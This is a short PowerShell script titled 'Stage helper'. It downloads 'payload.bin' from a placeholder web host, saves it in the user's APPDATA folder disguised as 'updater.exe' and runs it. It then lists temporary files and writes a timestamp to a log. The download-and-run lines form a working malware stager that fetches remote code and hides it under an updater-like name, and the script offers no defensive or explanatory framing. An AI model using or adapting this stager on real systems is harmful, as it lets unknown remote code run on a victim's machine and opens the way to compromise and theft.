# Stage helper
Start-BitsTransfer -Source 'http://contoso.com/payload.bin' -Destination "$env:APPDATA\updater.exe"
Start-Process -FilePath "$env:APPDATA\updater.exe"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
